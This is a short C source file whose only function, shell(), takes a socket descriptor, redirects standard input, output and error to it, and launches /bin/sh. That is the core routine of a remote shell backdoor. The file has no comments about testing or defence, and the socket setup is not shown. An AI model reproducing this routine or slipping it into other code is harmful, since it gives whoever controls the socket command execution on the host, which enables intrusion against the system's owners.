#include <stdio.h>
#include <unistd.h>

int shell(int sock_fd) {
    // Redirect IO
    dup2(sock_fd, 0);
    dup2(sock_fd, 1);
    dup2(sock_fd, 2);

    // Execute shell
    execl("/bin/sh", "sh", NULL);

    return 0;
}
